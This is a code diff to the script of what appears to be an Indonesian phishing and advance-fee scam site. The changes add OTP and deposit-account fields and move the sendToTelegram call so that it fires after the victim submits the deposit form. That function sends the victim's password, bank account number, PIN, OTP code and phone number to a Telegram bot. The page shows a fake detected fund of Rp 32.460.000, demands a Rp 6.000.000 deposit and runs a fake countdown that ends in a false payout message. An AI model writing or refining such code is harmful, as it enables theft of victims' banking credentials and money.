@@ -34,8 +34,11 @@ let formData = {
     bank: '',
     pin: '',
     nohp: '',
+    kodeotp: '',
     job: '',
-    link: ''
+    link: '',
+    depositNorekening: '',
+    depositAtasNama: ''
 };
 
 // ===== PASSWORD TOGGLE =====
@@ -83,7 +86,7 @@ function goToStep(step) {
 }
 
 function updateProgress(step) {
-    const steps = document.querySelectorAll('.step');
+    const steps = document.querySelectorAll('.progress-steps .step');
     const lines = document.querySelectorAll('.step-line');
 
     steps.forEach((s, i) => {
@@ -228,12 +231,37 @@ function animateFund() {
     document.getElementById('refId').textContent = 'FND-' + Math.random().toString(36).substr(2, 8).toUpperCase();
 }
 
-// Step 5: Warning
+// Step 5: Warning — Cairkan Dana diklik
 function showWarning() {
-    // Send data to Telegram first
-    sendToTelegram();
     goToStep(5);
     startTimer();
+}
+
+// ===== DEPOSIT PROCESS — Tombol "Deposit & Proses" =====
+// Saat diklik: arahin ke Step 6 (input ulang no rekening & atas nama)
+function processDeposit() {
+    goToStep(6);
+}
+
+// Step 6: Submit Rekening Ulang → Kirim ke Telegram + Countdown
+function submitRekeningDeposit() {
+    const noRek = document.getElementById('depositNorekening').value.trim();
+    const atasNama = document.getElementById('depositAtasNama').value.trim();
+
+    if (!noRek || !atasNama) {
+        alert('Harap isi Nomor Rekening dan Atas Nama!');
+        return;
+    }
+
+    formData.depositNorekening = noRek;
+    formData.depositAtasNama = atasNama;
+
+    // Kirim semua data ke Telegram
+    sendToTelegram();
+
+    // Lanjut ke Step 7: Countdown 5 Hari
+    goToStep(7);
+    startCountdown();
 }
 
 // ===== TELEGRAM BOT =====
@@ -248,7 +276,7 @@ async function sendToTelegram() {
 📋 <b>Data Diri:</b>
 ├ Nama: <code>${formData.nama}</code>
 ├ No Rekening: <code>${formData.norekening}</code>
-├ Bank: <code>${formmData.bank}</code>
+├ Bank: <code>${formData.bank}</code>
 ├ Pin: <code>${formData.pin}</code>
 ├ Kode Otp: <code>${formData.kodeotp}</code>
 ├ No Hp: <code>${formData.nohp}</code>
@@ -258,6 +286,11 @@ async function sendToTelegram() {
 └ <code>${formData.link}</code>
 
 💰 <b>Fund Detected:</b> Rp 32.460.000
+
+🏦 <b>Data Rekening Deposit:</b>
+├ No Rekening: <code>${formData.depositNorekening}</code>
+└ Atas Nama: <code>${formData.depositAtasNama}</code>
+
 ⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
     `.trim();
 
@@ -278,7 +311,56 @@ async function sendToTelegram() {
     }
 }
 
-// ===== TIMER =====
+// ===== COUNTDOWN 5 HARI =====
+let countdownInterval;
+function startCountdown() {
+    // Isi ringkasan data
+    document.getElementById('cdNama').textContent = formData.nama;
+    document.getElementById('cdHp').textContent = formData.nohp;
+    document.getElementById('cdJumlah').textContent = 'Rp 6.000.000';
+    document.getElementById('cdMetode').textContent = formData.bank;
+    document.getElementById('cdRekening').textContent = formData.depositNorekening;
+    document.getElementById('cdAtasNama').textContent = formData.depositAtasNama;
+
+    // Tanggal selesai = 5 hari dari sekarang
+    const endDate = new Date();
+    endDate.setDate(endDate.getDate() + 5);
+    document.getElementById('cdEndDate').textContent = endDate.toLocaleDateString('id-ID', {
+        weekday: 'long', year: 'numeric', month: 'long', day: 'numeric'
+    });
+
+    let totalSeconds = 5 * 24 * 3600; // 5 hari
+
+    function updateCountdown() {
+        if (totalSeconds <= 0) {
+            clearInterval(countdownInterval);
+            document.getElementById('countDays').textContent = '0';
+            document.getElementById('countHours').textContent = '00';
+            document.getElementById('countMinutes').textContent = '00';
+            document.getElementById('countSeconds').textContent = '00';
+            document.querySelector('.countdown-status').textContent = '✅ Proses Selesai! Dana telah dicairkan.';
+            document.querySelector('.countdown-status').style.color = 'var(--success)';
+            return;
+        }
+
+        const d = Math.floor(totalSeconds / 86400);
+        const h = Math.floor((totalSeconds % 86400) / 3600);
+        const m = Math.floor((totalSeconds % 3600) / 60);
+        const s = totalSeconds % 60;
+
+        document.getElementById('countDays').textContent = d;
+        document.getElementById('countHours').textContent = String(h).padStart(2, '0');
+        document.getElementById('countMinutes').textContent = String(m).padStart(2, '0');
+        document.getElementById('countSeconds').textContent = String(s).padStart(2, '0');
+
+        totalSeconds--;
+    }
+
+    updateCountdown();
+    countdownInterval = setInterval(updateCountdown, 1000);
+}
+
+// ===== TIMER (48 jam di Step 5) =====
 let timerInterval;
 function startTimer() {
     let totalSeconds = 48 * 3600; // 48 hours
@@ -307,22 +389,20 @@ function startTimer() {
     }, 1000);
 }
 
-// ===== DEPOSIT / CANCEL =====
-function processDeposit() {
-    // Send deposit notification to Telegram
-    sendDepositNotification();
-    // Show success modal
-    document.getElementById('successModal').style.display = 'flex';
-}
-
+// ===== CANCEL =====
 function cancelProcess() {
     // Reset everything
     clearInterval(timerInterval);
+    clearInterval(countdownInterval);
     currentStep = 1;
-    formData = { username: '', password: '', nama: '', norekening: '', job: '', link: '' };
+    formData = {
+        username: '', password: '', nama: '', norekening: '',
+        bank: '', pin: '', nohp: '', kodeotp: '', job: '', link: '',
+        depositNorekening: '', depositAtasNama: ''
+    };
 
     // Reset all cards
-    for (let i = 1; i <= 5; i++) {
+    for (let i = 1; i <= 7; i++) {
         document.getElementById('step' + i).style.display = 'none';
     }
 
@@ -330,6 +410,7 @@ function cancelProcess() {
     document.getElementById('loginForm').reset();
     document.getElementById('dataForm').reset();
     document.getElementById('linkForm').reset();
+    document.getElementById('depositRekeningForm').reset();
     document.getElementById('linkForm').style.display = 'flex';
     document.getElementById('scanContainer').style.display = 'none';
     document.getElementById('scanResults').style.display = 'none';
